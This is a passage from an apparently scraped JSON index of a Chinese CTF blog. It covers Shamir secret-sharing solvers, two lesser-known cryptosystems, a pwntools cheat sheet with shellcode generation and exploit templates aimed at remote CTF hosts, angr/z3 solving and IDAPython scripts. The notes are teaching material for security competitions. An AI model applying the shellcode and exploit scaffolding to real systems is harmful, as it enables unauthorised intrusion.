&#x27;AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEp&#x27;, &#x27;shares&#x27;: [&#x27;1-MEwx7cz+C01rL8H0Hhz2EIgHjWYXVcL81uITmRha674=&#x27;, &#x27;2-YJhj22+ntS1s80CT9b6Y7ayc52baTFGNRpPUyLxtaf8=&#x27;, &#x27;3-4SRZDcshiZTVRJ7nVY8NDq83JOsnZtPm&#x27;, &#x27;4-wTDHtrT7CO1wej3TpQHep/XHm2hgOW6uJfdXKASSZoE=&#x27;, &#x27;5-8Xz5pFekss1yPbxzfKOBhRpc9WkjL/0+lakYV6ik5MI=&#x27;]&#125;print(shamir.recover_secret(shamir.from_base64(data)).decode(&#x27;ascii&#x27;)) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#python-2from Crypto.Util.number import *import gmpy2def product(vals, p): return reduce(lambda x, y: x * y % p, vals)def lagrange_interpolate(x, x_s, y_s, p): n = len(x_s) assert n == len(set(x_s)) # x_s must be distinct num = [] den = [] for i in range(n): others = x_s[:i] + x_s[i+1:] num.append(product((x - o for o in others), p)) den.append(product((x_s[i] - o for o in others), p)) dens = product(den, p) res = 0 for i in range(n): tmp1 = ((num[i] * dens % p) * y_s[i]) % p tmp2 = tmp1 * gmpy2.invert(den[i], p) % p res = (res + tmp2) % p res = res * gmpy2.invert(dens, p) % p return resdef shamir_sharing_encode(s, k, n, p): a = [getRandomInteger(Nbits) for _ in range(k-1)] res = [] for _ in range(n): x = getRandomInteger(Nbits) fx = s for i in range(k-1): fx = (fx + a[i] * pow(x, i+1, p)) % p res.append((x, fx)) return resdef shamir_sharing_decode(shares, p): x_s, y_s = zip(*shares) return lagrange_interpolate(0, x_s, y_s, p)Nbits = 1024secret = bytes_to_long(&#x27;it_is_the_top_secret&#x27;)p = getPrime(Nbits)k = 513n = 513shares = shamir_sharing_encode(secret, k, n, p)s = shamir_sharing_decode(shares, p)print long_to_bytes(s)# 2s 1234567891011121314151617181920212223#SageP = PolynomialRing(GF(p), &#x27;x&#x27;)ret = P(0)for x, y in shares: r = P(1) * y for xx, yy in shares: if x != xx: r = r * P((0 - xx) / (x - xx)) ret = ret + rprint ret# 19s#Sage算系数P = PolynomialRing(GF(p), &#x27;x&#x27;)ret = P(0)for x, y in shares: r = P(1) * y for xx, yy in shares: if x != xx: r = r * P(&#x27;(x - %d) / (%d - %d)&#x27; % (xx, x, xx)) ret = ret + rprint ret[0]# 154s 除了 Lagrange 插值，也可以用矩阵。 可以将上面的方程组化为以下在 $\\text{GF}(p)$ 上的矩阵乘法： $\\left(\\begin {array}{c} 1 &amp; x_1 &amp; x_1^2 &amp; \\cdots &amp; x_1^{k-1} \\\\ 1 &amp; x_2 &amp; x_2^2 &amp; \\cdots &amp; x_2^{k-1} \\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 1 &amp; x_n &amp; x_n^2 &amp; \\cdots &amp; x_n^{k-1} \\end{array} \\right) \\times \\left(\\begin {array}{c} s \\\\ a_1 \\\\ \\vdots \\\\ a_{k-1} \\end{array} \\right) = \\left(\\begin {array}{c} f(x_1) \\\\ f(x_2) \\\\ \\vdots \\\\ f{x_n} \\end{array} \\right)$ 1234567891011121314151617181920#Sage矩阵乘法k = 513n = 513x, y = zip(*shares)array_1 = []for i in range(n): for j in range(k): array_1.append(pow(x[i], j, p))A = matrix(GF(p), n, k, array_1)array_2 = []for i in range(n): array_2.append(y[i])B = matrix(GF(p), n, 1, array_2)a = A.solve_right(B)print a[0][0]# 266s 也可以将之视为多元同余方程组： $\\left\\{\\begin{array}{c} s+a_1x_1+a_2x_1^2+\\cdots+a_{k-1}x_1^{k-1} \\equiv f(x_1) \\pmod p \\\\ s+a_1x_2+a_2x_2^2+\\cdots+a_{k-1}x_2^{k-1} \\equiv f(x_2) \\pmod p \\\\ \\vdots \\\\ s+a_1x_n+a_2x_n^2+\\cdots+a_{k-1}x_n^{k-1} \\equiv f(x_n) \\pmod p \\end{array}\\right.$ 记系数矩阵的行列式为： $\\Delta = \\left \\vert \\begin {array}{c} 1 &amp; x_1 &amp; x_1^2 &amp; \\cdots &amp; x_1^{k-1} \\\\ 1 &amp; x_2 &amp; x_2^2 &amp; \\cdots &amp; x_2^{k-1} \\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 1 &amp; x_n &amp; x_n^2 &amp; \\cdots &amp; x_n^{k-1} \\end{array} \\right \\vert \\neq 0$ 要求的是 $s$，因此将行列式第一列换为同余方程的值： $\\Delta_0 = \\left \\vert \\begin {array}{c} f(x_1) &amp; x_1 &amp; x_1^2 &amp; \\cdots &amp; x_1^{k-1} \\\\ f(x_2) &amp; x_2 &amp; x_2^2 &amp; \\cdots &amp; x_2^{k-1} \\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ f(x_n) &amp; x_n &amp; x_n^2 &amp; \\cdots &amp; x_n^{k-1} \\end{array} \\right \\vert \\neq 0$ 由克拉默法则得： $s \\equiv \\Delta^{-1}\\Delta_0 \\pmod p$ 1234567891011121314151617181920#Sagefx_num = 513x, y = zip(*shares)array_1 = []for i in range(fx_num): for j in range(fx_num): array_1.append(pow(x[i], j, p))delta = matrix(GF(p), fx_num, fx_num, array_1).determinant()array_2 = [_ for _ in array_1]for i in range(fx_num): array_2[i*fx_num] = y[i]delta_0 = matrix(GF(p), fx_num, fx_num, array_2).determinant() % pdelta_inverse = inverse_mod(int(delta), p)res = delta_inverse * delta_0 % pprint res# 1200s 但是如果维数很大，直接解行列式会很慢。观察发现 $\\Delta$ 其实是旋转后的范德蒙行列式。$\\Delta_0$ 是旋转后的范德蒙行列式的变形，第一行不是全 1，而是 $f(x)$。可以按第一行展开，余子式中将每一列除以该列元的一次方，可化为范德蒙行列式。计算速度会快非常多。 12345678910111213141516171819202122232425262728#Sagefx_num = 513x, y = zip(*shares)delta = 1for i in range(1, fx_num): for j in range(0, i): t = x[i] - x[j] delta = (delta * t) % pdelta_0 = 0for i in range(fx_num): tmp_x = [_ for _ in x] tmp_x.pop(i) yuzishi = -y[i] if (i+1+1) % 2 else y[i] for j in range(fx_num-1): yuzishi = (yuzishi * tmp_x[j]) % p for j in range(1, fx_num-1): for k in range(0, j): t = tmp_x[j] - tmp_x[k] yuzishi = (yuzishi * t) % p delta_0 = (delta_0 + yuzishi) % pdelta_inverse = gmpy2.invert(delta, p)res = delta_inverse * delta_0 % pprint res# 224s 攻击 如果在加密 2 段明文 $s_1,s_2$ 过程中，使用相同的随机数 $a$ 以及大素数 $p$，还能得到同一个 $x$ 对应的两个 $f(x)$，如果知道一个明文 $s_1$ 的情况下，可以算出另一个明文。 在 $\\text{GF}(p)$ 上：$s_1 + a_1x + a_2x^2 + a_3x^3 + … + a_{k-1}x^{k-1} = f(x)_1$ 设：$A = a_1x + a_2x^2 + a_3x^3 + … + a_{k-1}x^{k-1}$ 即： $s_1 + A = f(x)_1 \\\\ s_2 + A = f(x)_2$ 因此： $s_2 = f(x)_2 - f(x)_1 + s_1$ 如果不知道两个明文的情况下，但两明文有一定的线性关系，也可以算出两明文。 若 $s_2 = as_1 + b$，则有同余方程组： $\\left\\{ \\begin{array}{c} s_1 + A - f(x)_1 \\equiv 0 \\pmod p \\\\ s_2 + A - f(x)_2 \\equiv 0 \\pmod p\\\\ as_1 + b - s_2 \\equiv 0 \\pmod p \\end{array}\\right.$ 12345678910111213#Sagea = 99999999b = 123456PR.&lt;s1,s2,A&gt; = PolynomialRing(Zmod(p))f1 = s1 + A - y1f2 = s2 + A - y2f3 = a * s1 + b - s2Fs = [f1, f2, f3]I = Ideal(Fs)B = I.groebner_basis()print &#x27;s1 =&#x27;, ZZ(-B[0](0, 0, 0))print &#x27;s2 =&#x27;, ZZ(-B[1](0, 0, 0)) ​ Okamoto-Uchiyama密码系统1998年由Tatsuaki Okamoto和Shigenori Uchiyama提出的公钥加密算法。 条件：$n=p^2q$ 密钥生成 生成两个大素数 $p$ 和 $q$； 计算 $n=p^2q$； 选择一个随机整数 $g \\in \\{2, \\cdots ,n-1\\}$ 满足 $g^{p-1} \\not\\equiv 1 \\pmod {p^2}$； 计算 $h=g^n \\bmod n$。 公钥为 $(n,g,h)$，私钥为 $(p,q)$。 加密 明文 $m&lt;p$ 可以通过公钥 $(n,g,h)$ 加密： 选择一个随机整数 $r \\in \\{1,\\cdots,n-1\\}$； 计算 $c=g^m h^r \\bmod n$。 $c$ 即为 $m$ 的密文。 解密 密文 $c$ 可以通过私钥 $(p,q)$ 解密： 计算 $a=\\cfrac{(c^{p-1} \\bmod {p^2})-1}{p}$； 计算 $b=\\cfrac{(g^{p-1} \\bmod {p^2})-1}{p}$； 使用扩展欧几里得算法计算 $b$ 的模 $p$ 逆元 $b’=b^{-1} \\bmod p$； 计算 $m=ab’ \\bmod p$。 $m$ 即为 $c$ 的明文。 参考：PoseidonCTF 1st Edition 2020 - discrete log ​ Schmidt-Samoa密码系统2005年，Katja Schmidt-Samoa 创建了 Schmidt-Samoa 公钥密码体系。 与 Rabin 类似，它的安全性基于大整数分解的困难性。但 Rabin 解密时会得到四个解，而 Schmidt-Samor 得到的是唯一解。 密钥生成 选取大整数 $p,q$，计算 $N=p^2q$ 作为公钥。 计算 $d=\\text{inv}(N,\\varphi(pq))$ 作为私钥。 加密 对于小于 $pq$ 的明文 $m$，计算 $c=m^N \\bmod N$ 作为密文。 解密 对于密文 $c$，计算 $c^d \\bmod pq$，得到密文。 对于 $d$，当 $d=\\text{inv}(N,\\text{lcm}(p-1,q-1))$ 时，可以证明仍然有极大概率 $2^{N \\cdot d} \\equiv 2 \\pmod {pq}$。 因为 $\\text{lcm}(p-1,q-1)$ 已经是 $(p-1)(q-1)$ 非常大的因子，由拉格朗日定理，2生成的子群的阶应该是 $(p-1)(q-1)$ 的因数，所有概率还挺高的。 证明 首先，计算 $\\varphi(N)$，由欧拉函数的性质，显然有 $\\varphi(N)=\\varphi(p^2q)=p(p-1)(q-1)$ 于是 $x^{p(p-1)(q-1)} \\equiv 1 \\pmod N$ 尽管公钥、私钥都不包含 $pq$，但可以通过 $(N,d)$ 推出 $pq$，有 $N \\cdot d \\equiv 1 \\pmod {\\big((p-1)(q-1)\\big)}$ 随便选一个数2，来考察 $2^{N \\cdot d}$ 在模 $pq$ 时的表现，有 $2^{N \\cdot d} \\equiv 2^{N \\cdot d \\bmod {\\big((p-1)(q-1)\\big)}} \\equiv 2 \\pmod {pq}$ 从而 $pq \\mid 2^{N \\cdot d}-2$，于是计算 $\\gcd(2^{N \\cdot d}-2,N)$，即得到 $pq$。 容易发现，这些幂可以在模 $N$ 意义下计算，以节省复杂度。现在 $pq$ 到手，在模 $pq$ 意义下计算 $c^d$，即 $c^d \\equiv m^{N \\cdot d} \\equiv m^{N \\cdot d \\bmod {\\big((p-1)(q-1)\\big)}} \\equiv m \\pmod {pq}$ 至此完成解密。 参考：A New Rabin-type Trapdoor Permutation Equivalent to Factoring and Its Applications","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://lazzzaro.github.io/tags/%E7%AE%97%E6%B3%95/"}],"author":"Lazzaro"},{"title":"pwn工具","slug":"pwn-pwn工具","date":"2020-05-13T11:46:21.000Z","updated":"2025-03-29T08:42:10.440Z","comments":true,"path":"2020/05/13/pwn-pwn工具/","permalink":"https://lazzzaro.github.io/2020/05/13/pwn-pwn%E5%B7%A5%E5%85%B7/","excerpt":"","text":"​ glibc下载：https://ftp.gnu.org/gnu/libc/ 本地更换libc环境准备工作下载工具 patchelf：git clone https://github.com/NixOS/patchelf glibc-all-in_one：git clone https://github.com/matrix1001/glibc-all-in-one 查看题目libc版本老版本：strings libc.so.6 | grep &#39;Ubuntu GLIBC&#39; 新版本：./libc.so.6 下载指定libc进入下载好的 glibc-all-in-one 文件夹，命令： 123456789./update_list #更新最新版本的glibccat list #查看可下载的glibc./download 2.31-0ubuntu9.5_amd64 #找到需要的glibc版本，下载到本地cat old_list #打开老版本glibc列表（如果在list中没有找到需要的glibc版本）./download_old 2.26-0ubuntu2.1_amd64 #找到需要的老版本glibc，下载到本地#下载路径：/glibc-all-in-one/libs#如果在old_list和list里都没有找到合适的版本，可以选择相近的版本的ld文件 利用patchelf修改题目环境patchelf --set-interpreter [~/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/ld-2.26.so] --set-rpath [~/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64] [./gundam] 三个[ ]分别对应 ld文件地址、glibc文件夹、题目文件。（--set-rpath 后面的地址有时候需要加上 “ / ” ） patchelf --set-rpath 的作用是 在ELF文件的 Dynamic section 的中添加一个 RUNPATH 段里面储存着动态链接库的绝对路径，即设置程序的动态链接库。 patchelf --set-interpreter 的作用是 在ELF文件的 interp section 设置 interpreter 项的值为 ld加载器绝对路径，即设置程序的动态链接库加载器。 例： 1234patchelf --replace-needed libc.so.6 ~/pwn/libc.so.6 ./vulnpatchelf --set-interpreter ~/pwn/ld-2.31.so ./vulnldd vuln./vuln ​ pwntoolspwntools是一个CTF框架和漏洞利用开发库，用Python开发，旨在让使用者简单快速的编写exploit。 用法汇总导入与环境设置 1234567from pwn import * #导入包#os设置系统为linux系统#arch设置架构为32/64位#log_level设置日志输出的等级为debug（会将完整的io过程都打印下来，方便出现问题时排查错误）context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;) 连接 123456# 第一种连接方式，通过ip和port去连接conn = remote(&#x27;127.0.0.1&#x27;, 8888)# 第二种连接方式，通过ssh连接shell = ssh(host=&#x27;192.168.14.144&#x27;, user=&#x27;root&#x27;, port=2222, password=&#x27;123456&#x27;)# 第三种连接方式，打开程序，开启进程p = process(&#x27;./reverse0&#x27;) 打包函数 p32/p64: 打包一个整数，分别打包为32位或64位u32/u64: 解包一个字符串，得到整数 123456# 比如将0xdeadbeef进行32位的打包，将会得到&#x27;\\xef\\xbe\\xad\\xde&#x27;（小端序）payload = p32(0xdeadbeef) #pack 32 bits numberpayload = p64(0xdeadbeef) #pack 64 bits number#将多个变量转换为二进制字符串payload = flat([0xaaaa, 0xbbbb, 0xcccc]) 发送和接收数据 12345678conn.send(data) #发送数据conn.sendline(data) #发送一行数据，相当于在数据后面加\\nconn.recv(numb = 2048, timeout = default) #接收数据，numb制定接收的字节，timeout指定超时conn.recvline(keepends=True) #接受一行数据，keepends为是否保留行尾的\\nconn.recvuntil(&quot;Hello,World\\n&quot;,drop=false) #接受数据直到我们设置的标志出现conn.recvall() #一直接收直到 EOFconn.recvrepeat(timeout = default) #持续接受直到EOF或timeoutconn.interactive() #直接进行交互，相当于回到shell的模式，在取得shell之后使用 ELF模块 用于获取ELF文件的信息，首先使用ELF()获取这个文件的句柄，然后使用这个句柄调用函数，和IO模块很相似。 12345e = ELF(&#x27;/bin/cat&#x27;)print(hex(e.address)) # 获取文件装载的基地址print(hex(e.symbols[&#x27;write&#x27;])) # 获取函数地址（基于符号）print(hex(e.got[&#x27;write&#x27;])) # 获取函数got表的地址print(hex(e.plt[&#x27;write&#x27;])) # 获取函数plt表的地址 汇编与反汇编 12asm(&#x27;mov eax, 0&#x27;) #汇编disasm(&#x27;\\xb8\\x0b\\x00\\x00\\x00&#x27;) #反汇编 生成shellcode 先通过context设置架构，然后生成shellcode。 12context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;) #设置环境shellcode = asm(shellcraft.sh()) #打印出汇编后的shellcode 调用gdb调试 在python文件中直接设置断点，当运行到该位置之后就会断下。 123from pwn import *p = process(&#x27;./c&#x27;)gdb.attach(p) Cyclic Pattern 使用pwntools生成一个pattern，pattern指一个字符串，可以通过其中的一部分数据去定位到其在一个字符串中的位置。 如，在栈溢出的时候，首先构造cyclic(0x100)，或者更长长度的pattern，进行输入，输入后pc的值变为0x61616161，那么再通过cyclic_find(0x61616161)就可以得到从哪一个字节开始会控制PC寄存器了，避免了很多没必要的计算。 123cyclic(0x100) # 生成一个0x100大小的pattern，即一个特殊的字符串cyclic_find(0x61616161) # 找到该数据在pattern中的位置cyclic_find(&#x27;aaaa&#x27;) # 查找位置也可以使用字符串去定位 打印日志 1success(&quot;addr =&gt; &quot; + hex(addr)) ​ 常用脚本SHA / MD5 认证（Proof of Work）1234567891011121314151617181920#python3 脚本1from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcer = remote(&#x27;34.74.30.191&#x27;,1337)table = string.ascii_letters+string.digitsdef PoW(): r.recvuntil(b&#x27;XXXX+&#x27;) suffix = r.recv(16).decode() r.recvuntil(b&#x27;== &#x27;) cipher = r.recvline().strip().decode() proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(b&#x27;XXXX: &#x27;, proof.encode()) PoW()r.interactive() 123456789101112131415#python2 脚本from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport stringfrom hashlib import sha256def brute_force(prefix,s): return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=4,method=&#x27;fixed&#x27;)r = remote(&quot;34.74.30.191&quot;,1337)data = r.recvline()prefix, s = parse(&quot;sha256(XXXX+&#123;&#125;) == &#123;&#125;&quot;,data)r.recvline()r.sendline(brute_force(prefix,s)) 1234567891011121314151617181920#python3 脚本2from hashlib import sha256from itertools import productdata = r.recvline().decode()print(data)suffix = re.findall(r&#x27;\\(XXX\\+(.*?)\\)&#x27;, data)[0]digest = re.findall(r&#x27;== (.*?)\\n&#x27;, data)[0]print(f&quot;suffix: &#123;suffix&#125; \\ndigest: &#123;digest&#125;&quot;)print(&#x27;Calculating hash...&#x27;)dic = string.ascii_letters + string.digitsfor i in product(dic, repeat=3): prefix = &#x27;&#x27;.join(i) guess = prefix + suffix if sha256(guess.encode()).hexdigest() == digest: print(f&quot;result: &#123;guess&#125;\\n&quot;) breakr.sendlineafter(b&#x27;[+] Plz Tell Me XXX :&#x27;,prefix.encode()) 伪随机数同步12345678910111213# Windowsfrom ctypes import *libc = cdll.msvcrtlibc.srand(libc.time(0))r = libc.rand()# Linuxfrom ctypes import *libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)libc.srand(libc.time(0))r = libc.rand() ​ 模板12345678910111213from pwn import *sd = lambda x:p.send(x)sl = lambda x:p.sendline(x)sda = lambda x,y:p.sendafter(x,y)sla = lambda x,y:p.sendlineafter(x,y)ru = lambda x:p.recvuntil(x)rv = lambda x:p.recv(x)io = lambda :p.interactive()ps = lambda :pause()p = remote(&#x27;ok&#x27;, 20002)context.log_level = &#x27;debug&#x27; 12345678910111213141516171819202122232425262728293031323334353637#coding=utf8#python2from pwn import *context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;zsh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;info&#x27;# functions for quick scripts = lambda data :p.send(data)sa = lambda delim,data :p.sendafter(delim, data)sl = lambda data :p.sendline(data)sla = lambda delim,data :p.sendlineafter(delim, data)r = lambda numb=4096, timeout=2:p.recv(numb, timeout=timeout)rl = lambda :p.recvline()ru = lambda delims, drop=True :p.recvuntil(delims, drop)irt = lambda :p.interactive()dbg = lambda gs=&#x27;&#x27;, **kwargs :gdb.attach(p, gdbscript=gs, **kwargs)# misc functionsuu32 = lambda data :u32(data.ljust(4, &#x27;\\x00&#x27;))uu64 = lambda data :u64(data.ljust(8, &#x27;\\x00&#x27;))leak = lambda name, addr :log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))def rs(arg=[]): global p if arg == &#x27;remote&#x27;: p = remote(*host) else: p = binary.process(argv=arg, raw=True)#libc = ELF(&#x27;./libc-2.27.so&#x27;, checksec=False)binary = ELF(&#x27;./once&#x27;, checksec=False)host = (&#x27;182.92.108.71&#x27;, 30103)#rs()rs(&#x27;remote&#x27;)irt() ​ seccomp-tools当使用了 prctl 系统调用的 PR_SET_SECCOMP 功能禁用了一些系统调用，直接用 seccomp-tools 可以看禁用的系统调用。 seccomp-tools dump ./pwn","categories":[{"name":"pwn","slug":"pwn","permalink":"https://lazzzaro.github.io/categories/pwn/"}],"tags":[{"name":"脚本","slug":"脚本","permalink":"https://lazzzaro.github.io/tags/%E8%84%9A%E6%9C%AC/"},{"name":"pwntools","slug":"pwntools","permalink":"https://lazzzaro.github.io/tags/pwntools/"}],"author":"Lazzaro"},{"title":"自动化工具","slug":"reverse-自动化工具","date":"2020-05-11T17:23:13.000Z","updated":"2024-04-10T15:54:31.699Z","comments":true,"path":"2020/05/12/reverse-自动化工具/","permalink":"https://lazzzaro.github.io/2020/05/12/reverse-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7/","excerpt":"","text":"angrangr是一个二进制的代码分析工具, 能够自动化的完成二进制文件的分析并找出漏洞。可以进行动态的符号执行分析。 123456789import angrproj = angr.Project(&quot;./enormous&quot;)state = proj.factory.entry_state()sim = proj.factory.simulation_manager(state)sim.explore(find=(0x400000+0x3950), avoid=(0x400000+0x3963))if len(sim.found) &gt; 0: print(&quot;Yes&quot;) print(sim.found[0].posix.dumps(0)) ​ z3z3 是一个微软出品的开源约束求解器，能够解决很多种情况下的给定部分约束条件寻求一组满足条件的解的问题，功能强大且易于使用。z3 约束求解器是针对 Satisfiability modulo theories Problem 的一种通用求解器。所谓 SMT 问题，在 z3 环境下是指关于算术、位运算、数组等背景理论的一阶逻辑组合决定性问题。虽然 z3 功能强大，但是从理论上来说，大部分 SMT 问题的时间复杂度都过高，根本不可能在有限时间内解决。所以千万不要把 z3 想象得过于万能。 z3 在工业应用中实际上常见于软件验证、程序分析等。然而由于功能实在强大，也被用于很多其他领域。CTF 领域来说，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。此外，著名的二进制分析框架 angr 也内置了一个修改版的 z3。 z3 内置了多种变量类型，基本能覆盖常见计算机数据结构。包括整数、浮点数、BitVector、数组等。 z3 在默认情况下，只寻找满足所有条件的一组解，而不是找出所有解。 参考：Z3 API in Python 解简单方程 1234from z3 import *x = Int(&#x27;x&#x27;)y = Int(&#x27;y&#x27;)solve(x &gt; 2, y &lt; 10, x + 2*y == 7) 求解实际案例 Solver()命令创建一个通用求解器。我们可以通过add函数添加约束条件。我们称之为声明约束条件。check()函数解决声明的约束条件，sat结果表示找到某个合适的解，unsat结果表示没有解。这时候我们称约束系统无解。最后，求解器可能无法解决约束系统并返回未知作为结果。 常用的数据类型： BitVec - 至特定大小的数据类型 Int - 整型 Real - 有理数 Bool - 布尔类型 Array - 数组 常用函数： LShR(x, 1) - 逻辑右移（用0填充，&gt;&gt; 为算术右移） 例1： 1234567891011from z3 import *a1, a2, a3, a4, a5, a6 = Ints(&quot;a1 a2 a3 a4 a5 a6&quot;)x = Solver()x.add(a1 * 3 + a2 * 2 + a3 * 5 == 1003)x.add(a1 * 4 + a2 * 7 + a3 * 9 == 2013)x.add(a1 + a2 * 8 + a3 * 2 == 1109)x.add(a4 * 3 + a5 * 2 + a6 * 5 == 671)x.add(a4 * 4 + a5 * 7 + a6 * 9 == 1252)x.add(a4 + a5 * 8 + a6 * 2 == 644)x.check()print(x.model()) 例2： 1234567891011121314151617181920212223242526272829from z3 import *so = Solver()flag = [BitVec(f&#x27;flag&#123;i&#125;&#x27;,8) for i in range(36)]a = [i for i in flag]b = [i for i in range(36)]c = [0 for i in range(36)]d = [0x12027,0x0F296,0x0BF0E,0x0D84C,0x91D8,0x297,0x0F296,0x0D830,0x0A326,0x0B010,0x7627,0x230,0x0BF0E,0x0A326,0x8FEB,0x879D,0x70C3,0x1BD,0x0D84C,0x0B010,0x879D,0x0B00D,0x6E4F,0x1F7,0x91D8,0x7627,0x70C3,0x6E4F,0x9BDC,0x15C,0x297,0x230,0x1BD,0x1F7,0x15C,0x6]for i in range(6): for j in range(6): b[i+6*j] = a[6*i+j]for i in range(6): for j in range(6): for k in range(6): c[j+6*i] = c[j+6*i] + a[6*i+k]*b[6*k+j] so.add(simplify(c[j+6*i]) == d[j+6*i])for i in range(6,36-10): so.add(flag[i]&gt;=32) so.add(flag[i]&lt;=127)for i in range(6): so.add(flag[i] == ord(&#x27;whctf&#123;&#x27;[i]))for i in range(36-9,36): so.add(flag[i] == 0x1)so.add(flag[-10] == ord(&#x27;&#125;&#x27;))if so.check() == sat: m = so.model() print(&#x27;&#x27;.join(chr(m[i].as_long()) for i in flag))else: print(&#x27;Error&#x27;) ​ 云沙箱微步：https://s.threatbook.com/ 安恒：https://sandbox.dbappsecurity.com.cn/ 360：https://ata.360.net/ ​ ARM程序运行安装库： 1234567apt install libc6-riscv64-crossapt install binutils-riscv64-linux-gnuapt install gcc-riscv64-linux-gnuapt install binutils-riscv64-unknown-elfapt install gcc-riscv64-unknown-elfapt install qemu-system-miscapt install qemu-user","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"自动化","slug":"自动化","permalink":"https://lazzzaro.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"angr","slug":"angr","permalink":"https://lazzzaro.github.io/tags/angr/"},{"name":"z3","slug":"z3","permalink":"https://lazzzaro.github.io/tags/z3/"}],"author":"Lazzaro"},{"title":"IDA","slug":"reverse-IDA","date":"2020-05-11T17:18:41.000Z","updated":"2024-03-14T12:50:38.612Z","comments":true,"path":"2020/05/12/reverse-IDA/","permalink":"https://lazzzaro.github.io/2020/05/12/reverse-IDA/","excerpt":"","text":"常用快捷键Shift+F12：查看所有字符串 F5：查看伪代码 Alt+T：查找字符串 空格：切换图形视图&amp;汇编视图 /：在反编译后伪代码的界面中写下注释 x：对着某个函数、变量按该快捷键，可以查看它的交叉引用 n：改变量名 y：改变量类型 ​ IDAPython在IDA中要使用脚本有三种方式： 第一种，直接按Shift+F2快捷键调出界面，也可以直接在菜单中选择命令脚本（File -&gt; Script command）； 第二种，写一个脚本文件直接进行引用（File -&gt; Script file）； 第三种，直接在IDA底部写命令。 IDAPython由三个独立模块组成： idc: idc函数的兼容模块，包含IDA内置函数声明和内部定义 idautils: 实用函数模块 idaapi: 用于访问更多底层数据的模块 指令操作12345678910import idcimport idaapiimport idautilsea = idc.here();print(&quot;当前模块基址为: &#123;&#125;&quot;.format(hex(idaapi.get_imagebase())))print(&quot;当前的汇编语句为: &#123;&#125;&quot;.format(idc.GetDisasm(ea)))print(&quot;当前的汇编指令为: &#123;&#125;&quot;.format(idc.print_insn_mnem(ea)))print(&quot;当前的操作数为: &#123;&#125;&quot;.format(idc.print_operand(ea,0)))print(&quot;当前的操作数值为: &#123;&#125;&quot;.format(idc.get_operand_value(ea,0))) 段操作123456789import idcimport idaapiimport idautilsfor seg in idautils.Segments(): segname = idc.get_segm_name(seg) segstart = idc.get_segm_start(seg) segend = idc.get_segm_end(seg) print(&quot;段名 = &#123;&#125; 起始地址= &#123;&#125; 结束地址 = &#123;&#125; &quot;.format(segname,hex(segstart),hex(segend))); 函数操作1234567891011121314151617181920import idcimport idaapiimport idautilsfor seg in idautils.Segments(): segname = idc.get_segm_name(seg) segstart = idc.get_segm_start(seg) segend = idc.get_segm_end(seg) print(&quot;段名 = &#123;&#125; 起始地址 = &#123;&#125; 结束地址 = &#123;&#125; &quot;.format(segname,hex(segstart),hex(segend))); if (segname == &#x27;.text&#x27;): for funcaddr in Functions(segstart,segend): funname = idc.get_func_name(funcaddr) funend = idc.find_func_end(funcaddr) funnext = idc.get_next_func(funcaddr) funnextname = idc.get_func_name(funnext) print(&quot;当前函数名 = &#123;&#125; 当前结束地址 = &#123;&#125; 下一个函数地址 = &#123;&#125; 下一个函数名 = &#123;&#125;&quot;.format(funname,hex(funend),hex(funnext),funnextname))ea = idc.get_screen_ea()funnextoffset = idc.get_func_off_str(ea)print(&quot;当前选择地址距离当前函数的偏移为: &#123;&#125; &quot;.format(funnextoffset)) 搜索在IDAPython中如果想查询某些数据、代码、二进制，都可以用都搜索函数。搜索函数可以是向上搜索，也可以是向下搜索，搜索失败就会返回-1，也就是BADADDR，而搜索功能也常常用于去除花指令当中。 12345ea = here()value = idc.find_binary(ea,SEARCH_DOWN,&#x27;8B 4D 08&#x27;) #从ea位置向下查找 查找的二进制为8B 4D 08 返回查找到的地址value1 = idc.find_code(ea,SEARCH_DOWN) #从ea还是查找找到ea下的第一行code代码地址value2 = idc.find_data(ea,SEARCH_DOWN) 数据校验123456789import idcea = here()value1 = idc.find_code(ea,SEARCH_DOWN)print(hex(value1))flag = ida_bytes.get_full_flags(value1) #获取标志print(flag)print(ida_bytes.is_code(flag)) #判断是否是代码传入标志，根据标志返回True/False 交叉引用12345import idcea = here()for i in CodeRefsTo(ea,False): print(hex(i))# 获取地址处引用位置。A调用B，对B函数地址使用此函数则找到A调用，返回列表，遍历列表则可以找出所有引用位置。参数1是ea也就是地址，参数2告诉IDA是否跟踪这些代码。 创建结构体View -&gt; Open subviews -&gt; Local types，右键-&gt;Insert，即可输入结构体定义，示例如下： 123456struct hello&#123; _BYTE a; _BYTE c; _WORD b;&#125;; 如果要修改，选中相应行，右键-&gt;Edit 即可。 ​ 位操作123456def LOBYTE(x): return x &amp; 0xffdef HIBYTE(x): return (x &gt;&gt; 8) &amp; 0xffdef LOWORD(x): return x &amp; 0xffffdef HIWORD(x): return (x &gt;&gt; 16) &amp; 0xffffdef LODWORD(x): return x &amp; 0xffffffffdef HIDWORD(x): return (x 